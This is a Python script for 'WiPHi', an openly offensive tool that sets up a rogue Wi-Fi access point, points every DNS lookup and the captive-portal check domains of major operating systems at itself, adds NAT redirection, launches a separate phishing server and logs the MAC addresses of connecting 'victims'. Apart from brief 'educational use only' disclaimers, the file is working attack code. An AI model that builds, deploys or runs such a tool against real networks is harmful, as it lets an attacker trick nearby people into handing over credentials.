#!/usr/bin/env python3
"""
WiPHi - WiFi Phishing Access Point Tool

This script creates a fake WiFi access point and serves a phishing page to connected users.
It requires a wireless card that supports AP mode and must be run with root privileges.

WARNING: This is intended for educational use in controlled environments only.
Unauthorized use may be illegal and unethical.

"""

import subprocess
import time
import logging
import threading
import argparse
import os
import sys

HOSTAPD_FLAG = None
SERVER_FLAG = None

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)


def apMode(interface, ssid, chan, password, max_host):

    """
    Configures and starts a rogue access point using hostapd and dnsmasq.

    Args:
        interface (str): Network interface Name (e.g., wlan0)
        ssid (str): SSID for the fake network
        chan (int): Channel to broadcast on
        password (str): Sets WPA2+WPA3 Security
        max_hosts (int): Maximum number of allowed hosts
    """

    logging.info("Configuring hostapd and dnsmasq...")
    logging.info(f"SSID: {ssid} using Interface:{interface}")
    
    global HOSTAPD_FLAG,SERVER_FLAG

    if max_host > 255:
        logging.critical(f"{max_host} number of Hosts is not possible. Setting to 255")
        max_host = 255

    hostapd_settings = (f"interface={interface}\n"
    "driver=nl80211\n"
    f"ssid={ssid}\n"
    "hw_mode=g\n"
    f"max_num_sta={max_host}\n"
    f"channel={chan}\n"
    "macaddr_acl=0\n"
    "auth_algs=1\n"
    "ignore_broadcast_ssid=0\n"
    "logger_stdout=2\n")

    dnsmasq_settings = (f"interface = {interface}\n"
    "dhcp-range = 10.0.0.10,10.0.0.100,12h\n"
    "address = /#/10.0.0.1\n"
    "address = /connectivitycheck.gstatic.com/10.0.0.1\n"
    "address = /clients3.google.com/10.0.0.1\n"
    "address = /www.apple.com/10.0.0.1\n"
    "address = /allawnos.com/10.0.0.1\n"
    "address = /allawnos.com/10.0.0.1\n"
    "address = /www.msftconnecttest.com/10.0.0.1\n"
    "address = /connectivitycheck.android.com/10.0.0.1\n"
    "address = /conn-service-in-04.alaawnos.com/10.0.0.1\n"
    "address=/captive.apple.com/10.0.0.1\n"
    "address=/detectportal.firefox.com/10.0.0.1\n"
    "address=/msftncsi.com/10.0.0.1\n")
    

    with open(r"configs/hostapd.conf", "w+") as config:
        config.write(hostapd_settings)
        
    if password != None:
        security = ("wpa=2\n"
            "wpa_key_mgmt=WPA-PSK SAE\n"
            "rsn_pairwise=CCMP\n"
            "ieee80211w=1\n"
            f"wpa_passphrase={password}\n")
        
        with open(r"configs/hostapd.conf", "a") as config:
            config.write(security)
            
    with open(r"configs/dnsmasq.conf", "w+") as config:
        config.write(dnsmasq_settings)

    logging.info("Completed configuring hostapd and dnsmasq...")
    
    logging.info(f"Starting Access Point {ssid}...")
    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"]) 
    
    try:
        HOSTAPD_FLAG = subprocess.Popen(
        ["sudo", "hostapd", "configs/hostapd.conf"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True)

        threading.Thread(target=monitor_hostapd_output,
                        args=(HOSTAPD_FLAG,),
                        daemon=True).start()
        
    except OSError as e:
        logging.critical(f"An error occured: {e}", exc_info=True)
        return False

    logging.info(f"Setting up dnsmasq and IP Forwarding...")
    subprocess.run(["dnsmasq","-C", "configs/dnsmasq.conf"])
    subprocess.run(["ifconfig", interface, "10.0.0.1", "netmask", "255.255.255.0"])
    subprocess.run("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True, stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"])

    logging.info(f"Starting Server...")
    logging.warning(f"CTRL + C to stop!")
    try:
        SERVER_FLAG = subprocess.Popen(["python3", "server.py"])
        logging.info(f"Server Loaded Successfuly!")

        print("\n" + "*"*50 + "\n" + "   VICTIMS CAN SEE YOU!  \n" + "*"*50 +"\n") 
        return True
    except OSError as e:
        logging.critical(f"An error occured: {e}", exc_info=True)
        return False


def monitor_hostapd_output(proc):
    
    """
    Monitors hostapd stdout for client connection and disconnection events.
    Logs MAC addresses of connected/disconnected clients.
    """

    logging.info("Monitoring for client connections via hostapd...")
    for line in iter(proc.stdout.readline, ''):
        line = line.strip()
        if "AP-STA-CONNECTED" in line:
            mac = line.split()[-1]
            logging.info(f"New client connected: MAC {mac}")

        elif "AP-STA-DISCONNECTED" in line:
            mac = line.split()[-1]
            logging.info(f"Client disconnected: MAC {mac}")

        elif "No such device" in line:
            print("Error: Interface not found.")
            return False

        elif "does not support AP mode" in line:
            print("Error: Interface does not support AP mode.")
            return False
        
        elif "Failed to initialize driver interface" in line:
            print("Error: Failed to initialize driver.")
            return False
        
        elif "Failed to start hostapd" in line:
            print("Error: hostapd failed to start.")
            return False

def quit():

    """
    Restores network settings and cleans up background processes.
    """

    global HOSTAPD_FLAG
    subprocess.run(["killall", "dnsmasq"])
    logging.info("Resetting Network Adapter")
    subprocess.run(["service", "NetworkManager", "restart"])
    logging.info("Resetting IP Forwarding")
    subprocess.run(['sudo',"iptables", "-F"])
    subprocess.run(['sudo',"iptables","-t","nat","-F"])
    subprocess.run("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True, stdout=subprocess.DEVNULL)

    if HOSTAPD_FLAG:
        HOSTAPD_FLAG.kill()
    if SERVER_FLAG:
        SERVER_FLAG.kill()

    logging.info("Everything back to normal")

def root_check():
    if os.geteuid() != 0:
        logging.critical("User is not root. Run it with 'sudo'!")
        sys.exit(1)



parser = argparse.ArgumentParser(description= "This tool only works if your WiFi card SUPPORTS AP(access point) Mode! This is a Wifi Phishing tool, WiPHi." \
" Please use this in CONTROLLED ENVIORNMENT and for STUDY PURPOSE only! WE WONT BE RESPONSIBLE FOR ANY DAMAGE DONE USING THIS TOOL!" \
" Our intention with this tool is only TO EDUCATE PEOPLE!")

parser.add_argument("--ssid", type=str, default="WiPhi Tool",metavar="SSID Name", help="This is the name which appears to the victim!")
parser.add_argument("--inter", type=str, default="wlan0",metavar="INTERFACE" ,help="Whats your Wifi interface? (Default value: wlan0)")
parser.add_argument("--ch", type=int, default="5",metavar="CHANNEL", help="Number of channels for the AP (Default value: 5)")
parser.add_argument("--password", type=str, default=None,metavar="Password", help="Uses WPA2 and WPA3 Security (Default: No password)")
parser.add_argument("--mh", type=int, default=20,metavar="Maximim Host", help="Maximum number of active host connections (Default: 20)")
args = parser.parse_args()



if __name__ == "__main__":
    root_check()

    try:
        running = apMode(args.inter, args.ssid, args.ch, args.password, args.mh)
        if running:
            while True:
                time.sleep(1)
    
    except KeyboardInterrupt:
        logging.critical("STOPPING")
    
    finally:
        quit()
